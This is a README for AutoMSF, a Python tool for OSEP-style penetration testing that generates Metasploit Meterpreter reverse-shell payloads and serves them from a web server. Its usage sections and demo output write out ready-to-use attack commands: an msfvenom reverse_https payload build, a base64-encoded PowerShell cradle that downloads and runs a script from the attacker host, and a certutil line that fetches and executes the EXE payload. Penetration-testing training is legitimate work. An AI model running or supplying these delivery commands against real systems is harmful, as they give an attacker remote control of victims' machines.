# AutoMSF

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.0-brightgreen" alt="Version">
  <img src="https://img.shields.io/badge/Language-Python%203-blue" alt="Language">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-orange" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-lightgrey" alt="License">
</p>

<p align="center">
  <b>AutoMSF</b> is an advanced Metasploit payload generator and launcher that automates the creation of multiple payload types for penetration testing.
</p>

<p align="center">
  <a href="https://xbz0n.sh"><img src="https://img.shields.io/badge/Blog-xbz0n.sh-red" alt="Blog"></a>
</p>

---

## Overview

AutoMSF automates the process of generating various Meterpreter payloads using msfvenom, a part of the Metasploit framework. The tool streamlines the workflow for security professionals during penetration tests and security assessments, particularly for OSEP challenges.

## Features

- **Self-contained** - All functionality consolidated in a single Python script
- **Multiple payload formats** - Generate EXE, PowerShell, VBA, C#, HTA, and more
- **Command line utility** - Easy to use with multiple command line options
- **Network interface detection** - Automatic IP detection for common interfaces
- **Obfuscation options** - Random filename generation
- **Web hosting** - Payloads automatically copied to web server
- **Execution commands** - Ready-to-use download and execution commands
- **Cross-platform compatibility** - Works on Linux, macOS, and Windows (with WSL)
- **Metasploit integration** - Automatic handler generation

## Platform Compatibility

| Platform | Compatibility | Notes |
|--------------|---------------|-----------------|
| Kali Linux | ✅ | Fully supported |
| Ubuntu/Debian | ✅ | Metasploit required |
| macOS | ✅ | Requires Metasploit |
| Windows | ✅ | Use with WSL |

## Requirements

- Python 3.6 or higher
- Metasploit Framework
- Apache web server (for hosting payloads)

## Installation

```bash
# Clone the repository
git clone https://github.com/xbz0n/AutoMSF.git
cd AutoMSF

# Ensure the script is executable
chmod +x automsf.py
```

## Usage

### Basic Usage

```bash
# Generate default payloads with IP and port
python3 automsf.py 192.168.1.100 4444
```

### Advanced Options

```bash
# Generate payloads using tun0 interface for IP detection
python3 automsf.py --interface tun0 4444

# Generate specific payload types and formats
python3 automsf.py 192.168.1.100 4444 --payload windows/meterpreter/reverse_tcp --formats exe psh hta

# Obfuscate filenames with random strings
python3 automsf.py 192.168.1.100 4444 --obfuscate

# Specify an output directory
python3 automsf.py 192.168.1.100 4444 --output-dir /path/to/output

# Start Metasploit handler automatically
python3 automsf.py 192.168.1.100 4444 --start-handler
```

## Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `LHOST` | IP address to listen on (required) | - |
| `LPORT` | Port to listen on (required) | - |
| `--interface`, `-i` | Network interface to use for IP detection | - |
| `--payload`, `-p` | Metasploit payload to use | windows/x64/meterpreter/reverse_https |
| `--formats`, `-f` | Output formats to generate | exe,psh,vbapplication,csharp |
| `--output-dir`, `-o` | Directory to save generated files | ./payloads |
| `--start-handler`, `-s` | Start Metasploit handler immediately | False |
| `--obfuscate`, `-b` | Use random filenames for payloads | False |
| `--check`, `-c` | Check dependencies and exit | False |

## Workflow

1. The tool checks for required dependencies
2. It generates payloads using msfvenom with your specified parameters
3. The payloads are copied to the web server directory for hosting
4. The tool creates a Metasploit resource script for handling connections
5. It generates download and execution commands for each payload type
6. Optionally starts a Metasploit handler to receive connections

## Demo Output

After successful execution, you'll see output similar to this:

```
    █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗███████╗███████╗
   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝██╔════╝
   ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████╗█████╗  
   ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  
   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║██║     
   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝     
                                                           v2.0
    Created by: Ivan Spiridonov (xbz0n)
    Website: https://xbz0n.sh

[*] Current Time: 2023-09-28 15:43:21
[*] Platform: Linux 5.15.0-kali3-amd64
[*] Python Version: 3.10.9
======================================================================
[*] Checking dependencies...
[+] Metasploit Framework found
[+] Apache web server is running
[+] Web directory exists
[*] Using LHOST=192.168.1.100, LPORT=4444
[*] Generating windows/x64/meterpreter/reverse_https payloads...
[*] Executing: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f exe -o ./payloads/payload_exe.exe
[+] Generated ./payloads/payload_exe.exe
[+] Copied ./payloads/payload_exe.exe to web server directory
[*] Executing: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f psh -o ./payloads/payload_psh.ps1
[+] Generated ./payloads/payload_psh.ps1
[+] Copied ./payloads/payload_psh.ps1 to web server directory
[+] Created Metasploit handler script: ./payloads/handler.rc

[*] Download and execution commands:

PS1 (payload_psh.ps1):
powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkAF8AcABzAGgALgBwAHMAMQAnACkA

EXE (certutil):
certutil -urlcache -split -f http://192.168.1.100/payload_exe.exe %TEMP%\payload_exe.exe && %TEMP%\payload_exe.exe

[*] Start the Metasploit handler with:
msfconsole -q -r ./payloads/handler.rc
```

## Security Considerations

- This tool is for educational purposes and authorized testing only
- Always obtain proper permission before performing any penetration testing
- The payloads generated may be detected by security software
- Use responsibly and legally

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Author

- **Ivan Spiridonov (xbz0n)** - [Blog](https://xbz0n.sh) | [GitHub](https://github.com/xbz0n)

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Acknowledgments

- Special thanks to the penetration testing community for inspiration
- Made for OSEP certification challenges
